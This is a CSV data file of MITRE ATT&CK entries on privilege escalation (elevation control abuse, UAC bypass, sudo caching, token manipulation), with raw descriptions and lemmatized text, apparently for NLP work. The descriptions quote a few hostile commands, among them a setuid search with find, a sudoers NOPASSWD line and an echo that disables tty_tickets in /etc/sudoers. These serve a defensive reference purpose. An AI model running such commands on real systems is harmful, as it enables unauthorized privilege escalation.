id,name,description,processed
T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,adversary circumvent mechanism design control elevate privilege gain high level permission modern system contain native elevation control mechanism intend limit privilege user perform machine authorization grant specific user order perform task consider high risk adversary perform method advantage build control mechanism order escalate privilege system
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 . This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.",adversary abuse configuration application setuid setgid bit set order code run different possibly privileged user context linux macos setuid setgid bit set application binary application run privilege own user group respectively normally application run current user context regardless user group own application instance program need execute elevated context function properly user run specific require privilege instead create entry sudoers file root user specify setuid setgid flag set application linux mac file directory permissions modification chmod command set bit bitmasking chmod enable setuid bit enable setgid bit chmod chmod adversary use mechanism malware sure able execute elevated context future abuse shell escape action bypass execution environment restrict permission alternatively adversary choose find target vulnerable binary setuid setgid bit enable file directory discovery setuid setguid bit indicate s instead x view file attribute ls find command search file example find null find file setuid set find null setgid binary bit set abuse adversary
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.exe can auto-elevate and execute a specified binary or script.Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",adversary bypass uac mechanism elevate process privilege system windows user account control uac allow program elevate privilege track integrity level range low high perform task administrator level permission possibly prompt user confirmation impact user range deny operation high enforcement allow user perform action local administrator group click prompt allow enter administrator password complete action uac protection level computer set high level certain windows program elevate privilege execute elevated component object model object prompt user uac notification box method discover bypass uac github readme page uacme contain extensive list method discover implement comprehensive list bypass additional bypass method regularly discover wild auto elevate execute specify binary script bypass possible lateral movement technique credential account administrator privilege know uac single system security mechanism privilege integrity process run system unknown remote system default high integrity
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",adversary perform sudo caching use sudoer file elevate privilege adversary execute command user spawn process high privilege linux macos system sudo refer superuser allow user perform command terminal elevate privilege control perform command system sudo command allow system administrator delegate authority certain user group user ability run command root user provide audit trail command argument sudo system administrator useful configuration feature time minute instance sudo prompt password sudo ability cache credential period time sudo create touch file db sudo timestamp sudo run determine timeout additionally variable treat new tty terminal session isolation mean example sudo timeout tty affect tty type password sudoer file sudoer describe user run command terminal describe command user run user group provide principle privilege user run low possible permission time elevate user permission need typically prompt password sudoer file specify prompt user password line like nopasswd elevated privilege require edit file adversary abuse poor configuration mechanism escalate privilege need user password example db sudo timestamp monitor fall range malware execute sudo command need supply user password additional disable adversary tty user wild malware disable potentially scripting easy issue echo sudoer order change reflect malware issue killall terminal macos sierra sudoer file enable default
T1548.004,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.",adversary leverage authorizationexecutewithprivileges api escalate privilege prompt user credential purpose api application developer easy way perform operation root privilege application installation updating api validate program request root privilege come reputable source maliciously modify api deprecate fully function late release macos call api user prompt enter credential check origin integrity program program call api load world writable file modify perform malicious behavior elevated privilege adversary abuse authorizationexecutewithprivileges obtain root privilege order install malicious software victim install persistence mechanism
T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",adversary modify access token operate different user system security context perform action bypass access control windows use access token determine ownership run process user manipulate access token run process appear child different process belong user start process occur process take security context associate new token adversary use build windows api function copy access token exist process know token stealing token apply exist process token impersonation theft spawn new process create process token adversary privileged user context administrator steal token adversary commonly use token stealing elevate security context administrator level system level adversary use token authenticate remote system account token account appropriate permission remote system standard user use runas command windows api function create impersonation token require access administrator account mechanism active directory field modify access token
T1134.001,Access Token Manipulation: Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",adversary duplicate impersonate user exist token escalate privilege bypass access control example adversary duplicate exist token duplicatetoken duplicatetokenex token impersonateloggedonuser allow call thread impersonate log user security context setthreadtoken assign impersonate token thread adversary perform token impersonation theft specific exist process want assign duplicate token example useful target user non network logon session system adversary instead use duplicate token create new process attach exist process additionally create process token createprocesswithtokenw token impersonation theft distinct impersonate token refer duplicate exist token create new
T1134.002,Access Token Manipulation: Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",adversary create new process exist token escalate privilege bypass access control process create token result security context user feature createprocesswithtokenw runa create process token associate current user require credential target user specific privilege impersonate user access token example token duplicate token impersonation theft create impersonate token create process technique distinct token impersonation theft technique conjunction token duplicate create new process
T1134.003,Access Token Manipulation: Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.This behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.",adversary new token impersonate user escalate privilege bypass access control example adversary username password user log system adversary create logon session user logonuser function function return copy new session access token adversary use setthreadtoken assign token thread behavior distinct token impersonation theft refer create new user token instead steal duplicate exist
T1134.004,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use.Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment.Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.",adversary spoof parent process identifier ppid new process evade process monitor defense elevate privilege new process typically spawn directly parent call process explicitly specify way explicitly assign ppid new process createprocess api support parameter define ppid use adversary abuse mechanism evade defense block process spawn directly office document analysis target unusual potentially malicious parent child process relationship spoof ppid powershell office document deliver spearphishing attachment explicitly assign ppid enable elevated privilege give appropriate access right parent process example adversary privileged user context administrator spawn new process assign parent process run system cause new process elevate inherit access token
